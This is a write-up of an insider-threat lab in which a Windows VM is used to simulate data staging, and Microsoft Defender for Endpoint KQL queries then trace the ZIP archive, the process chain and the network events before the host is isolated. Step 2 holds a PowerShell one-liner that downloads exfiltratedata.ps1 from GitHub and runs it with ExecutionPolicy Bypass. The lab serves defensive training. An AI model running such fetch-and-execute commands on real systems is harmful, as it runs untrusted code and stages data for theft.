# Data Exfiltration Simulation & Investigation – PIPd Employee Insider Threat Lab

## Overview
This lab simulates an insider threat scenario in which a privileged employee, John Doe, attempts to exfiltrate corporate data from a Windows VM.  Using Microsoft Defender for Endpoint (MDE) advanced hunting, we detect the staged data, trace the execution chain, validate the malicious script, and isolate the compromised host.

## Objectives
- **Simulate** a data‑exfiltration workflow on an onboarded VM.
- **Detect** the activity with MDE Kusto queries.
- **Validate** the malicious script and process chain on the endpoint.
- **Contain** the threat by isolating the device.

## Environment & Setup
| Item | Details |
|------|---------|
| **VM** | `windows-lab-tes` (Windows 10/11) |
| **MDE** | Microsoft Defender for Endpoint – fully onboarded and generating telemetry. |
| **Script** | `exfiltratedata.ps1` downloaded from GitHub and executed via PowerShell. |
| **Data Staging** | 7‑Zip archive created: `C:\ProgramData\employee-data-20260410153713.zip`. |

> **Note:** The VM is onboarded using the standard MDE onboarding process. Verification screenshots are included in the repo’s `images/` folder.

## Tools & Technologies
- **Microsoft Defender for Endpoint** – Advanced hunting, DeviceFileEvents, DeviceProcessEvents, DeviceNetworkEvents.
- **PowerShell** – Script execution and command chaining.
- **7‑Zip** – Compression utility used by the malicious script.
- **Kusto Query Language (KQL)** – Custom queries to hunt telemetry.

## Investigation Workflow

### 1️⃣ Onboard VM to MDE
*Verified that `windows-lab-tes` appears in the Device Inventory with a status of **Informational** and is actively sending telemetry.*

![Onboarding screenshot](images/image-5.png)

### 2️⃣ Simulate Suspicious Activity
Executed the following PowerShell command on the VM:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```
The script:
- Installs 7‑Zip silently (`7z2408-x64.exe`).
- Compresses employee data into `employee-data-20260410153713.zip`.
- Attempts an outbound transfer (not captured in the sample logs).

![PowerShell execution screenshot](images/image-1.png)

### 3️⃣ Hunt for ZIP Archive Activity
```kql
DeviceFileEvents
| where DeviceName == "windows-lab-tes"
| where FileName contains ".zip"
| order by Timestamp desc
```
Result: `employee-data-20260410153713.zip` created at **15:37:21.8238291 Z**.

![ZIP archive query screenshot](images/image-6.png)

### 4️⃣ Pivot to Process Events
```kql
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```
Key processes: `powershell.exe`, `cmd.exe`, `7z2408‑x64.exe`, `7z.exe`, `whoami.exe`.

![Process events screenshot](images/image-7.png)

### 5️⃣ Refine Process Hunt
```kql
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine, AccountName
```
Highlights:
- PowerShell executed with `ExecutionPolicy Bypass`.
- 7‑Zip invoked to create the ZIP.
- All under account `cyber-lab27`.

![Refined process query screenshot](images/image-8.png)

### 6️⃣ Network Activity Analysis
```kql
let VMName = "windows-lab-tes";
let specificTime = datetime(2026-04-10T15:37:21.8238291Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```
Findings:
- No outbound transfer of the ZIP file.
- Predominant traffic from `msedgewebview2.exe` (Microsoft Edge WebView).
- Inbound connection attempts to the VM.

![Network events screenshot](images/image-2.png)

### 7️⃣ Validate Script on Endpoint
Confirmed that `exfiltratedata.ps1` exists in `C:\ProgramData`. Reviewed its contents; it downloads the ZIP utility and compresses data locally.

![Script file screenshot](images/image-3.png)

### 8️⃣ Containment
Isolated `windows-lab-tes` from the network to prevent further data transfer while preserving evidence.

![Containment screenshot](images/image-4.png)

## Findings & Results
| Observation | Evidence |
|-------------|----------|
| **ZIP archive created** | `employee-data-20260410153713.zip` in `C:\ProgramData`. |
| **Process chain** | PowerShell → 7‑Zip installer → 7‑Zip compression. |
| **No confirmed exfiltration** | Network logs show only Edge WebView traffic and inbound attempts. |
| **Containment achieved** | VM isolated after evidence collection. |

## Skills Demonstrated
- Advanced hunting with MDE and KQL.
- Process forensics and chain‑of‑command analysis.
- Basic malware script review (PowerShell).
- Incident containment procedures.

## Key Takeaways
1. **Onboarding verification** is essential; telemetry cannot be relied upon if the endpoint isn’t onboarded.
2. **KQL** allows rapid correlation of file, process, and network events around a suspect timestamp.
3. **Local data staging** can be detected even when exfiltration isn’t confirmed; containment should still follow.
4. **Script validation** on the endpoint confirms telemetry findings and helps identify malicious components.

---

# What I Improved
- **Cleaned up structure**: Re‑organized content into clear sections with concise headings.
- **Enhanced readability**: Shortened paragraphs, removed filler, and used tables for quick scanning.
- **Fixed grammar & formatting**: Corrected typos, punctuation, and inconsistent markdown syntax.
- **Preserved technical detail**: Kept all original queries, timestamps, device names, and findings intact.
- **Added a “What I Improved” section** for transparency on the changes made.